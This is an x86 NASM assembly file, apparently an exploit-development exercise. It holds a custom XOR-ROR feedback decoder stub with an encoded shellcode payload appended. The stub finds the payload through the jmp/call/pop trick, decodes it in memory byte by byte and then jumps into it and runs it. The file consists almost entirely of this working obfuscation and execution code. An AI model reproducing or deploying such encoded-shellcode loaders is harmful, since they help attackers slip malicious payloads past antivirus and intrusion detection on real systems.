; Filename: xor-ror-feedback-decoder.nasm
; Author:  Re4son re4son [at] whitedome.com.au
; Purpose: XOR-ROR feedback encoder


global _start
section .text
_start:
  cld				; zero out edx
  mov dl, 0x2c			; initial key is used to find end of encoded shellcode
  push edx			;  and used as initial xor key
  jmp call_decoder		; jmp / call/ pop
decoder:
  pop esi			; jmp, call, pop
  pop eax			; use key as initial xor vector
decode:
  mov byte cl,[esi]		; encoded byte will define no of ror rotations of key for next xor
  xor byte [esi], al		; xor current byte with vector
  cmp byte [esi], dl		; have we decoded the end of shellcode string?
  jz shellcode			; if so, execute the shellcode
  mov al, byte [esi]		; decrypted byte will be the base for rotation to get key for next xor
  add ecx, edx			; add initial key to ecx
  ror al, cl			; rotate decrypted left byte times (encrypted left byte * initialisation vector)
  inc esi			; move to the next byte
  jmp short decode		; loop until entire shellcode is decoded
call_decoder:
  call decoder			; jmp / call / pop
shellcode: db 0x1d,0x58,0x5c,0x38,0xa9,0x56,0xb8,0x5f,0x65,0x1b,0x3c,0x0b,0xbc,0xe7,0xd2,0xdf,0x83,0xf1,0x44,0xda,0xc7,0x8c,0xbb,0xdb,0x1b,0x2d